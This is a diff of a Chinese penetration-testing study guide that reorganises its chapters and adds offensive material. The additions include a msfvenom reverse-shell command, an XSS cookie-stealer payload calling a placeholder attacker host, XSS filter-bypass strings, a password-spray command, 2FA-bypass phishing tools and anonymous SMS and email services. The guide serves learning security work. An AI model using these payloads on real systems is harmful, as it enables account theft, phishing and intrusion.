@@ -26,7 +26,6 @@
     - [编程语言](#编程语言)
       - [思想](#思想)
         - [MVC](#mvc)
-    - [Web容器分类](#web容器分类)
     - [数据库](#数据库)
       - [关系型](#关系型)
         - [关系型数据库代表](#关系型数据库代表)
@@ -105,11 +104,13 @@
       - [Burpsuite](#burpsuite)
     - [通用漏洞扫描工具](#通用漏洞扫描工具)
       - [网站扫描](#网站扫描)
+    - [Cobaltstrike](#cobaltstrike)
     - [kali](#kali)
       - [安装kali](#安装kali)
-    - [网站](#网站)
+  - [社会工程](#社会工程)
+  - [后门](#后门)
+    - [msfvenom](#msfvenom)
       - [Cobalt Strike](#cobalt-strike)
-    - [其他常见工具](#其他常见工具)
   - [待补充：购物建议](#待补充购物建议)
     - [硬件](#硬件)
     - [服务器](#服务器)
@@ -117,6 +118,7 @@
       - [国内](#国内)
       - [国外](#国外)
   - [你常用的](#你常用的)
+    - [匿名工具](#匿名工具)
     - [开放漏洞情报](#开放漏洞情报)
     - [寻找EXP](#寻找exp)
 - [web安全](#web安全)
@@ -148,18 +150,21 @@
       - [水平越权](#水平越权)
       - [垂直越权](#垂直越权)
       - [防御](#防御-1)
-    - [登录脆弱](#登录脆弱)
-      - [验证脆弱](#验证脆弱)
-        - [待补充：Token爆破](#待补充token爆破)
+  - [登录脆弱](#登录脆弱)
+    - [验证脆弱](#验证脆弱)
+      - [开发者不严谨](#开发者不严谨)
         - [验证码破解](#验证码破解)
           - [弱验证码绕过](#弱验证码绕过)
           - [识别绕过](#识别绕过)
       - [登陆点暴力破解](#登陆点暴力破解)
-        - [什么网站登录点可以进行暴力破解](#什么网站登录点可以进行暴力破解)
-        - [准备字典](#准备字典)
+        - [社工字典](#社工字典)
+      - [常见攻击方法](#常见攻击方法)
         - [暴力破解](#暴力破解)
-        - [其他登陆点攻击](#其他登陆点攻击)
-      - [密码重置](#密码重置)
+        - [密码喷洒攻击](#密码喷洒攻击)
+        - [获得登录凭证的下一步](#获得登录凭证的下一步)
+      - [防御与绕过方法](#防御与绕过方法)
+        - [待补充：AI破解](#待补充ai破解)
+        - [绕过双因素验证](#绕过双因素验证)
   - [CRLF 注入](#crlf-注入)
   - [宽字节注入](#宽字节注入)
   - [待整理：XXE](#待整理xxe)
@@ -217,21 +222,20 @@
       - [堆叠查询注入](#堆叠查询注入)
       - [cookie 注入](#cookie-注入)
   - [xss攻击](#xss攻击)
-      - [反射型](#反射型)
-      - [持久型](#持久型)
-      - [DOM型](#dom型)
+    - [典型用法](#典型用法)
     - [工具](#工具-3)
       - [XSStrike](#xsstrike)
       - [xss平台](#xss平台)
       - [beef-xss](#beef-xss)
     - [防御与绕过](#防御与绕过)
       - [httponly](#httponly)
-      - [常见绕过](#常见绕过)
+      - [绕过方案](#绕过方案)
   - [CSRF](#csrf)
     - [实战](#实战)
     - [防御](#防御-3)
+  - [待补充：模板注入](#待补充模板注入)
   - [SSRF](#ssrf)
-    - [常见攻击演示](#常见攻击演示)
+    - [常见攻击](#常见攻击)
       - [图片上传](#图片上传)
   - [DDOS 攻击](#ddos-攻击)
     - [DDOS 攻击手段](#ddos-攻击手段)
@@ -239,6 +243,29 @@
     - [DNS劫持](#dns劫持)
     - [HTTP劫持](#http劫持)
     - [DLL劫持](#dll劫持)
+- [绕过检测](#绕过检测)
+  - [待补充：免杀](#待补充免杀)
+  - [WAF绕过](#waf绕过)
+      - [市面上WAF](#市面上waf)
+        - [阿里云盾](#阿里云盾)
+        - [宝塔](#宝塔)
+        - [安全狗](#安全狗)
+        - [将会流行的WAF](#将会流行的waf)
+      - [市面上常见绕过工具](#市面上常见绕过工具)
+    - [通用](#通用)
+      - [待补充：全扫描工具](#待补充全扫描工具)
+      - [流量监控](#流量监控)
+        - [躲避](#躲避)
+        - [经验](#经验)
+    - [SQL绕过](#sql绕过)
+      - [默认未开启的防御绕过](#默认未开启的防御绕过)
+        - [sqlmap](#sqlmap)
+        - [手动](#手动)
+    - [文件上传绕过](#文件上传绕过)
+      - [安全狗](#安全狗-1)
+    - [xss 绕过](#xss-绕过)
+    - [权限控制拦截](#权限控制拦截)
+    - [其他绕过总结](#其他绕过总结)
 - [经验积累](#经验积累)
   - [中间件](#中间件-1)
     - [IIS](#iis)
@@ -263,29 +290,8 @@
       - [与SQL注入有关的预编译](#与sql注入有关的预编译)
       - [JSON WEB TOKEN](#json-web-token)
         - [破解](#破解-1)
-  - [WAF绕过](#waf绕过)
-      - [市面上WAF](#市面上waf)
-        - [阿里云盾](#阿里云盾)
-        - [宝塔](#宝塔)
-        - [安全狗](#安全狗)
-        - [将会流行的WAF](#将会流行的waf)
-      - [市面上常见绕过工具](#市面上常见绕过工具)
-    - [通用](#通用)
-      - [待补充：全扫描工具](#待补充全扫描工具)
-      - [流量监控](#流量监控)
-        - [躲避](#躲避)
-        - [经验](#经验)
-    - [SQL绕过](#sql绕过)
-      - [默认未开启的防御绕过](#默认未开启的防御绕过)
-        - [sqlmap](#sqlmap)
-        - [手动](#手动)
-    - [文件上传绕过](#文件上传绕过)
-      - [安全狗](#安全狗-1)
-    - [xss 绕过](#xss-绕过)
-    - [权限控制拦截](#权限控制拦截)
-    - [其他绕过总结](#其他绕过总结)
   - [蜜罐](#蜜罐)
-  - [木马](#木马)
+  - [Webshell](#webshell)
 - [系统漏洞](#系统漏洞)
   - [工具](#工具-5)
     - [探测工具简介](#探测工具简介)
@@ -293,17 +299,22 @@
         - [Metasploit](#metasploit)
   - [字典](#字典)
     - [制作](#制作)
+    - [fuzzy](#fuzzy)
 - [APP漏洞](#app漏洞)
   - [抓包](#抓包)
+- [待补充：应急响应](#待补充应急响应)
 - [社会工程学](#社会工程学)
-    - [套话](#套话)
-      - [社交媒体](#社交媒体)
-    - [钓鱼](#钓鱼)
+  - [以假乱真](#以假乱真)
+    - [站点伪造](#站点伪造)
+    - [域名伪造](#域名伪造)
+    - [who am i](#who-am-i)
+  - [钓鱼](#钓鱼)
+    - [工具](#工具-6)
+    - [钓鱼手段](#钓鱼手段)
+      - [宏 – Office](#宏--office)
+      - [非宏的 Office 文件 —— DDE](#非宏的-office-文件--dde)
+      - [隐藏的加密 payload](#隐藏的加密-payload)
       - [钓鱼 wifi](#钓鱼-wifi)
-        - [鱼叉攻击](#鱼叉攻击)
-      - [水坑攻击](#水坑攻击)
-      - [钓鱼邮件](#钓鱼邮件)
-      - [钓鱼技巧](#钓鱼技巧)
     - [定向社工](#定向社工)
   - [如何在本地查询](#如何在本地查询)
 - [经验](#经验-1)
@@ -328,7 +339,21 @@
         - [加被害者](#加被害者)
       - [社工库](#社工库)
   - [绕过CDN](#绕过cdn)
-- [后渗透](#后渗透)
+- [内网渗透](#内网渗透)
+  - [基础](#基础)
+    - [信息搜集](#信息搜集-1)
+    - [获取明文密码](#获取明文密码)
+      - [windows 2012](#windows-2012)
+      - [windows10](#windows10)
+      - [Mac](#mac)
+    - [横向渗透](#横向渗透)
+      - [传递爆破其他账户密码](#传递爆破其他账户密码)
+      - [控制方法1：定时任务放后门](#控制方法1定时任务放后门)
+      - [控制方法2：建立连接](#控制方法2建立连接)
+    - [SPN](#spn)
+  - [linux渗透](#linux渗透)
+    - [信息搜集](#信息搜集-2)
+- [杂项](#杂项)
   - [获取数据库账号密码](#获取数据库账号密码)
     - [mysql](#mysql-1)
       - [获取基本信息](#获取基本信息)
@@ -371,14 +396,6 @@
       - [Redis](#redis-1)
         - [Redis数据库权限提升](#redis数据库权限提升)
       - [PostgreSQL](#postgresql-1)
-  - [内网渗透](#内网渗透)
-    - [信息搜集](#信息搜集-1)
-    - [获取当前账户密码](#获取当前账户密码)
-    - [横向渗透](#横向渗透)
-      - [传递爆破其他账户密码](#传递爆破其他账户密码)
-      - [控制方法1：定时任务放后门](#控制方法1定时任务放后门)
-      - [控制方法2：建立连接](#控制方法2建立连接)
-    - [SPN](#spn)
 - [代码审计](#代码审计)
   - [phpweb](#phpweb)
     - [一键审计](#一键审计)
@@ -388,37 +405,36 @@
     - [基础开发知识](#基础开发知识)
     - [审计](#审计)
       - [手动](#手动-1)
-      - [工具](#工具-6)
-- [隐藏技术](#隐藏技术)
+      - [工具](#工具-7)
+- [待补充：物理攻击](#待补充物理攻击)
+  - [wifi](#wifi)
+  - [](#)
+- [待补充：隐藏技术](#待补充隐藏技术)
   - [实用工具](#实用工具)
-    - [匿名工具](#匿名工具)
     - [日志删除](#日志删除)
 - [下一步](#下一步)
-  - [找工作](#找工作)
-  - [自学](#自学)
-    - [文档](#文档)
-    - [视频](#视频)
-  - [如何赚钱](#如何赚钱)
-    - [靠技术](#靠技术)
-    - [技术沾边](#技术沾边)
-  - [刷题](#刷题)
-  - [工具社区](#工具社区)
+  - [渗透发展](#渗透发展)
+    - [自动化](#自动化)
+  - [待整理：个人发展与规划](#待整理个人发展与规划)
+    - [找工作](#找工作)
+    - [如何赚钱](#如何赚钱)
+      - [靠技术](#靠技术)
+      - [技术沾边](#技术沾边)
+    - [自学](#自学)
+      - [刷题](#刷题)
+      - [社区](#社区)
   - [知名机构](#知名机构)
-  - [社区](#社区)
+  - [社区](#社区-1)
     - [黑客组织和官网](#黑客组织和官网)
   - [期刊](#期刊)
   - [大会](#大会)
   - [导航](#导航)
   - [游戏](#游戏)
     - [红蓝对抗](#红蓝对抗)
-    - [SRC](#src)
   - [图书推荐](#图书推荐)
-    - [基础](#基础)
-    - [中级](#中级)
   - [博客](#博客)
   - [如何修成](#如何修成)
       - [成为什么样的人](#成为什么样的人)
-
 # 写在前面
 
 **作者：北丐**
@@ -439,7 +455,7 @@
 另外请记得同步我的最新文章，它总是比上一个版本更好。
 
 
-食用这篇文章的最好方法就是每次有新收获去在指定章节完善它。所以如果你有热情跟我一起进步，有责任心自始至终的完成这篇文章，那么请加群联系我吧。
+我热爱分享，文章可能有的部分对于你有帮助有的没有，选来用。请善待我的努力和分享精神。食用这篇文章的最好方法就是每次有新收获去在指定章节完善它。所以如果你有热情跟我一起进步，有责任心自始至终的完成这篇文章，那么请加群联系我吧。
 
 # 常见知识点
 
@@ -447,11 +463,8 @@
 
 ## 密码学和编码
 
-**加密和编码是什么**
-加密和编码在很多程序员口中是没有细分概念的，对于做安全的人来说，确实区分不要紧，只需要认识特征与知道这种方式是否可逆。编码是将一系列字符放入一种特殊格式以进行传输或存储的过程。 加密是将数据转换成密码的过程。
 
 **常用加密方式**
-个人系统在windows vista后，服务器系统在windows 2003以后，认证方式均为NTLM Hash；之前的(不多了)是LM hash
 对于网站常用base64对url中id进行加密
 对于数据库密码常用md5加密
 
@@ -738,12 +751,6 @@ MVC是一种主流的架构，是一种思想，很多源代码或CMS都是基�
 如图为thinkphp的MVC一个MVC结构
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717190355188.png)
 
-### Web容器分类
-
-nginx  
-IIS  
-Apache 
-tomcat  
 
 ### 数据库
 
@@ -774,12 +781,7 @@ Access 和 MySQL 等。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705151830704.png)
 
 ###### access
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706111732997.png)
-比其他数据库要低一等级，数据通常保存在源码下面。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210706111922835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-每个网站对应的数据库不一样，不像mysql或其他数据库一个网站对应一个数据库
-
+access数据库不同于其他数据库，它是一个独立的文件，有点像excel表。文件放在网站目录下，格式为mdb
 ###### mysql
   5.0以下（一般都是2000年左右的没有更新的网站才有）没有information_schema这个系统表，无法列表名等，只能用字典暴力跑表名、列名，这点access也是一样的。5.0以下是多用户单操作，5.0以上是多用户多操做。
   
@@ -861,6 +863,7 @@ find / -name *.cfg	查找敏感信息
 
 
 ### windows
+个人系统在windows vista后，服务器系统在windows 2003以后，认证方式均为NTLM Hash；之前的(不多了)是LM hash；kerberos用于域环境认证
 **DOS编程**
 DOS编程教程https://blog.csdn.net/u010400728/article/details/43967181把基础看一遍，剩下的我认为重点学习一下比如`|`,`||`,`&&`，`for`大概如何用就可以了。
 
@@ -1142,7 +1145,6 @@ www.xxx.com 加上/static;/backup
 拿到一定信息后，通过拿到的目录名称，文件名称及文件扩展名了解网站开发人员的命名思路，确定其命名规则，推测出更多的目录及文件名
 **dirbuster**
 kali自带ka的一款工具，fuzz很方便。kali中直接在命令行中输入dirbuster，我认为该工具更强大，同样支持字典，还支持递归搜索和纯粹爆破，纯粹爆破你可以选择A-Z0-9a-z_，对于定向攻击来说纯粹爆破太强大了，直接帮助我发现隐藏各个目录,我在利用纯粹爆破将线程拉到50，仍旧需要10000+天以上（缺点是我用虚拟机跑的，字典大就慢）
-
 
 
 ##### 目录爆破经验
@@ -1535,6 +1537,7 @@ Adobe 信息泄露（2013年）： https://nakedsecurity.sophos.com/2013/11/04/a
 Pastebin Dumps： http://psbdmp.ws/
 Exploit.In Dump
 Pastebin 的 Google Dork: site:pastebin.com intext:cyberspacekittens.com
+
 ## 综合工具
 
 ### 信息搜集
@@ -1747,10 +1750,11 @@ awvs_13.0.2009 web漏洞扫描器 安装教程,附下载破解包下载链接，
 
 
 
+### Cobaltstrike
+集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具
 
 ### kali
-
-Kali Linux是基于Debian面向网络安全人员的Linux发行版，由BackTrack发展而来。现由Offensive Security公司开发和维护，其内置许多网络安全工具，因此常用来做渗透测试和数字鉴证。kali有600+渗透工具，是目前黑客的最佳选择工具。
+kali有600+渗透工具。
 
 
 
@@ -1781,21 +1785,36 @@ docker run -i -t 53e9507d8515 /bin/bash
 安装成功后，进入kali系统后，输入nmap，打印如下：
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210616170405781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-### 网站
 
-**站长之家** [链接](http://tool.chinaz.com/nslookup/)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2021042805293680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-**reg007/0xreg**。可以查看目标用户使用这个邮箱还注册了哪些网站
 
-**nslookup**  查询IP
-[站长之家-在线nslookup执行，当然你也可以在kali直接利用或者将工具下载下来,这三种方式的查询结果都一样！](http://tool.chinaz.com/nslookup/)
+
+## 社会工程
+setkits
+默认集成在了kali；
+社会工程学模块包含了很多功能，若鱼叉式网络攻击、网页攻击、邮件群发攻击、无线接入点攻击、二维码攻击等等。
+
+## 后门
+### msfvenom
+msfvenom集成了msfpayload和msfencode
+msfvenom重要参数：
+-p payload设置 
+-e 编码设置	用来做免杀                   
+-a 系统结构
+-s payload最大大小   
+-i 编码次数
+-o 输出文件
+-f 生成文件格式。生成脚本执行文件或平台执行文件，如py,dll，exe等  `
+ –x | -k	捆绑生成。伪装类似图片马的意思
+ 以下是常用命令
+```bash
+msfvenom –p windows/meterpreter/reverse_tcp –f exe –o C:\back.exe
+```
 
 #### Cobalt Strike
 用来后期持久渗透，横向移动，流量隐藏、数据窃取的工具
-### 其他常见工具
-xshell，免费正版下载，官网 https://www.netsarang.com/en/free-for-home-school/
-phpstudy https://www.xp.cn/download.html
+
+
 ## 待补充：购物建议
 ### 硬件
 ### 服务器
@@ -1808,6 +1827,46 @@ phpstudy https://www.xp.cn/download.html
 #### 国外
 选离你所在的城市近的国家
 ## 你常用的
+### 匿名工具
+
+**手机**
+下面是一些免费的接码平台，可以收取短信验证码
+
+国际接码，不过中国的也很多 https://yunjisms.xyz/
+
+大多是其他国家的手机号，你注册有的网站可能无法识别此号码https://www.bfkdim.com/
+https://jiemahao.com
+http://zg.114sim.com/
+
+
+http://114sim.com/
+
+https://yunduanxin.net/
+http://z-sms.com/
+https://zusms.com
+
+www.kakasms.com
+www.materialtools.com
+www.suiyongsuiqi.com
+mianfeijiema.com
+www.114sim.com
+yunduanxin.net
+www.shejiinn.com
+www.zusms.com
+
+
+**邮箱**
+好用 https://www.moakt.com/zh
+https://temp-mail.org/zh/
+https://www.guerrillamail.com/zh/
+http://links.icamtech.com/
+
+VPS
+
+纯净无线设备
+
+纯净移动设备
+
 ### 开放漏洞情报
 cve
 exploit.db
@@ -1821,7 +1880,7 @@ securitytracker
 
 exploit.db
 seebug
-
+https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=escalation&colspec=ID+Type+Status+Priority+Milestone+Owner+Summary&cells=ids
 **软件**
 searchsploit是一个离线Exploit-DB的命令行搜索工具
 使用，所以就把他想象成搜索引擎就可以。此工具在kali就集成了，因此不必安装。
@@ -2215,14 +2274,16 @@ unlink，delfile是php中对应删除的函数
 4.直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理
 5.永远不要相信来自用户的输入，对于可控参数进行严格的检测与过滤
 
-### 登录脆弱
+## 登录脆弱
+**登录类型**
+在多个系统中，用户只需一次登录，各个系统即可感知该用户已经登录。比如阿里系的淘宝和天猫，很明显地我们可以知道这是两个系统，但是你在使用的时候，登录了天猫，淘宝也会自动登录。
+### 验证脆弱
 
-#### 验证脆弱
-
-##### 待补充：Token爆破
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713162605889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
+#### 开发者不严谨
+token（登录者独立令牌）呈现规律性，肉眼可见
+通过Session覆盖漏洞重置他人密码
+当验证和重置在一个界面时，可能存在此漏洞：重置别人密码时，替换为自己的手机号
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713124740798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 ##### 验证码破解
 
 **旧型**
@@ -2297,15 +2358,14 @@ reCAPTCHA等
 
 #### 登陆点暴力破解
 
-##### 什么网站登录点可以进行暴力破解
-
- - 服务器端没有做限制，而比如银行卡号密码就做了限制，如果攻击次数超过3，那么卡将被冻结，或者某IP尝试登录次数超过阈值，IP将被锁定
- - 没有做登录验证或被验证能被绕过
-   -明文传输或加密方式被你破解，其中大部分http都是明文传输，大部分https都是加密传输
-
-
-
-##### 准备字典
+##### 社工字典
+你可以从以下几个设计思路入手：
+月份和年份的数字组合
+电话
+姓名
+生日
+查看一些以前泄露出来的数据，找一些有没有目标公司的用户资料泄露，因为相同公司的用户可能会使用类似的密码。
+公司名称+年份/编号/特殊的字符 (如!,$,#,@）
 
 
 
@@ -2326,7 +2386,7 @@ https://www.bugku.com/mima/
 首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool
 爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章:
 https://xz.aliyun.com/t/7823
-
+#### 常见攻击方法
 ##### 暴力破解
 
 要是获得已知用户名的hash密码也能破解，具体做法是通过hashid识别hash类型，将用户名和你尝试的密码一一结合起来看是否hash值相等，相等即破解成功。这两种方法都是属于暴力破解，只不过一个是在线的一个是离线的，你仍旧都可以使用hydra破解
@@ -2342,20 +2402,39 @@ hydra爆破工具，在kali有集成。在kali上有个默认密码字典位于`
 类似工具：snetcrack、超级弱口令
 
 
-##### 其他登陆点攻击
-
-**密码喷洒攻击**
-基本上，密码爆破是用多个密码尝试破解同一个 ID。而密码喷洒攻击，是用一个密码来尝试多个用户ID，以便至少有一个用户 ID 被泄露。对于密码喷洒攻击，黑客使用社交工程或其他网络钓鱼方法收集多个用户 ID。通常情况下，至少有一个用户使用简单的密码，如12345678甚至是 p@ssw0rd。在密码喷洒攻击中，黑客会为他或她收集的所有用户 ID 应用精心构造的密码。因此，密码喷洒攻击可以定义为将相同的密码应用于组织中的多个用户帐户，目的是安全的对其中一个帐户进行未授权访问。暴力破解的问题在于，在使用不同密码进行一定次数的尝试后，系统可能会被锁定。为了避免这种情况，产生了收集用户 ID 并将可能的密码应用于它们的想法。使用密码喷洒攻击时，黑客也会采取一些预防措施。例
-如，如果他们尝试将 password1应用于所有用户帐户，则在完成第一轮后，他们不会立即开始将password2应用于这些帐户。他们将在黑客攻击中留出至少30分钟的时间。参考资料：Password Spray Attack Definition and Defending yourself
-**重置密码漏洞**
-常见方式：通过Session覆盖漏洞重置他人密码
-**AI破解**
 
 
-#### 密码重置
+##### 密码喷洒攻击
+基本上，密码爆破是用多个密码尝试破解同一个 ID。而密码喷洒攻击，是用一个密码来尝试多个用户ID，以便至少有一个用户 ID 被泄露。对于密码喷洒攻击，黑客使用社交工程或其他网络钓鱼方法收集多个用户 ID。通常情况下，至少有一个用户使用简单的密码，如12345678甚至是 p@ssw0rd。在密码喷洒攻击中，黑客会为他或她收集的所有用户 ID 应用精心构造的密码。因此，密码喷洒攻击可以定义为将相同的密码应用于组织中的多个用户帐户，目的是安全的对其中一个帐户进行未授权访问。暴力破解的问题在于，在使用不同密码进行一定次数的尝试后，系统可能会被锁定。为了避免这种情况，产生了收集用户 ID 并将可能的密码应用于它们的想法。使用密码喷洒攻击时，黑客也会采取一些预防措施。
+工具：spray官网地址	http://bit.ly/2EJve6N
+使用方法
+```bash
+spray.sh -owa <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <Domain>
+```
+ruler有spray类似的功能，但更多的利用ruler获得密码后可以利用此工具做钓鱼文件等https://github.com/sensepost/ruler
 
-当验证和重置在一个界面时，可能存在此漏洞：重置别人密码时，替换为自己的手机号
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713124740798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+##### 获得登录凭证的下一步
+破坏邮箱，发送恶意脚本的工具
+https://github.com/O365/python-o365
+该项目旨在以 Pythonic 的方式轻松地与 Microsoft Graph 和 Office 365 进行交互。访问电子邮件、日历、联系人、OneDrive 等。很容易以一种对初学者来说简单而直接的方式进行，对经验丰富的 Python 程序员来说感觉恰到好处。
+#### 防御与绕过方法
+
+ - 服务器端没有做限制，而比如银行卡号密码就做了限制，如果试错次数超过3，那么卡将被冻结，所以一般黑客是会收集多个账号
+ - 没有做登录验证或被验证能被绕过
+ - 双因素验证，趋势。但是很多网站只对他知名的站点做双因素，而古老的却不加防御
+- 明文传输或加密方式被你破解，其中大部分http都是明文传输，大部分https都是加密传输
+  
+
+##### 待补充：AI破解
+##### 绕过双因素验证
+双因素验证绕过是很困难的通常要结合钓鱼来绕过。钓鱼即通过伪造页面截取用户的请求，用模拟软件来将用户的请求反馈到真实网站中，进而完成登录
+ReelPhish，https://github.com/fireeye/ReelPhish
+还有一些其他工具可以处理不同的双因素验证绕过的情境：
+
+https://github.com/kgretzky/evilginx
+https://github.com/ustayready/CredSniper
+
+
 
 
 ## CRLF 注入
@@ -3124,10 +3203,6 @@ cookie注入 后接cookie值
 xss攻击执行的是javascript脚本，所以xss的执行结果可以通过过滤拦截可以通过源码读取,javascript脚本能执行多强就意味着xss能达到什么样的攻击。只要有数据交互的，数据展示的地方就有可能存在xss攻击比如对你的用户名展示，对你输入的东西展示。比如留言，网站callback等
 
 
-虽然盗取cookie是目前来看最流行的xss应用场景，但是这个触发条件也比较苛刻。攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址
-cookie还要有意义，如果对方是未登录状态的cookie就索然无味了。一般这种攻击要么就是在肯定对方大概率会查看你的页面时要么就是定向。
-
-
 **常见问题：cookie获取到了却登录不上？**
 区别两个术语
 cookie 储存本地 存活时间较长 小中型
@@ -3142,49 +3217,23 @@ http-only打开了或没登录
 phpinfo展示界面中拥有cookie值，你获取到这个之后可以访问网站，进行xss操作，如获取源码等
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710150205547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-#### 反射型
 
+### 典型用法
+
+虽然盗取cookie是目前来看最流行的xss应用场景，但是这个触发条件也比较苛刻。攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址
+cookie还要有意义，如果对方是未登录状态的cookie就索然无味了。一般这种攻击要么就是在肯定对方大概率会查看你的页面时要么就是定向。
+典型用法的代码参考与书籍《渗透测试实战》
 ```python
-url/?name=<script>alert(document.cookie)</script>
+<script>document.write('<img src="http//<YourIP>/Stealer.php?cookie='%2B document.cookie %2B '"/>');</script>
 ```
-
-**xss脚本**
-
+强制下载
 ```bash
-<img src=1 onerror=alert(1);>
-#当管理员对>进行转义时，你可以采用onclick
-' onclick="alert(2)"
-#过滤了on,但是这种写法要点击不像script直接跳转
-a href='javascript:alert(1)'
-
+<script>var link = document.createElement('a'); link.href ='http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = '';document.body.appendChild(link); link.click();</script>
 ```
-
-#### 持久型
-
-数据写在了服务器中
-**玩法: 盗取竞争对手订单**
-去竞争对手网站购买东西，填写订单信息如电话号码等时导入对方的cookie
-
-#### DOM型
-
-写过前端界面的人都能很好理解什么是DOM型，即用户进行某种操作如点击onclick关联了前端脚本函数。这种漏洞你可以看到源码，而前两种不可以
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520191509433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-
-
-ign()这些方法通过Javascript实现跳转。我们第一时间可能想到的是限制不严导致任意URL跳转漏洞，而DOM XSS与此似乎“八竿子打不着”，实际上跳转部分参数可控，可能导致Dom xss。
-
-首先我们来看个简单的例子:
-
-var hash = location.hash;
-if(hash){
-    var url = hash.substring(1);
-    location.href = url;
-}
-那么可以使用伪协议#javascript:alert(1)。
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520190651246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
+重定向
+```bash
+<script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
+```
 
 ### 工具
 #### XSStrike
@@ -3258,29 +3307,39 @@ beef还是很强大的，入侵成功后可以对对方页面进行跳转或者�
 
 ### 防御与绕过
 首先需要寻找可注入的参数，以免你的输入被直接过滤掉了。比如通过查看网页的返回你将能找到某个可注入的参数，xss可能出现在任何地方比如你的ip被回显到界面，比如page参数通常也会回显到界面
-#### httponly
-
-管理员只需要在配置文件中修改一句话就可以开启了。开启后无法通过js脚本读取cookie信息，这能一定程度增加了xss获取cookie的难度。但是比如alert等该弹出来的还是会出来的。
-
 开启httponly，输入过滤，输出过滤等
 
->我见过一个挺恶心的WAF,微软这个。一旦<后面跟任何字母都算是危险操作 
->过滤 </xxx> 组合
+
+#### httponly
+
+管理员只需要在配置文件中修改一句话就可以开启了。开启后无法通过js脚本读取cookie信息，这能一定程度增加了xss获取cookie的难度，换句话说开启了httponly你的xss后台获取的就是空。但这对其他xss没有过滤效果
 
 
-#### 常见绕过
 
+
+#### 绕过方案
+**٩( 'ω' )و 手动**
 
 尝试脚本大写
-多个script嵌套
-用img标签
-eval转换
 unicode网络编码
+多个script嵌套
+eval转换
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(2222222222222222) )
 不常见函数
+```bash
+<b onmouseover=alert('XSS')>Click Me!</b>
+<svg onload=alert(1)>
+<body onload="alert('XSS')">
+<img src="http://test.cyberspacekittens.com" onerror=alert(document.cookie);>
+```
 
-fuzzy https://xssfuzzer.com/fuzzer.html
-
-
+**工具**
+fuzz
+https://xssfuzzer.com/fuzzer.html
+https://github.com/foospidy/payloads/tree/master/other/xss
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+新型绕过
+http://www.jsfuck.com/
 
 ## CSRF
 只要受害者在登录状态，点击了一下你的链接，就可以完成攻击。一般你在选取csrf界面时你应该选择可以添加（管理员、用户等）、删除、修改等操作上。如果不能做这些即便有相关漏洞也是没什么危害的。
@@ -3314,16 +3373,26 @@ fuzzy https://xssfuzzer.com/fuzzer.html
 >3.检验referer来源，请求时判断请求连接是否为当前管理员正在使用的页面(管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败)
 >4.设置验证码
 >5.限制请求方式只能为POS
-
+## 待补充：模板注入
+模板引擎由于其模块化和简洁的代码与标准 HTML 相比而被更频繁地使用。模板注入是指用户输入直接传递到渲染模板，允许修改底层模板
 ## SSRF
 
 这个漏洞比CSRF难防范得多，一些大型网站甚至在稍微不注意的时候都会留下这个漏洞。
+SSRF 漏洞允许你可以执行以下操作：
+
+> 在回环接口上访问服务
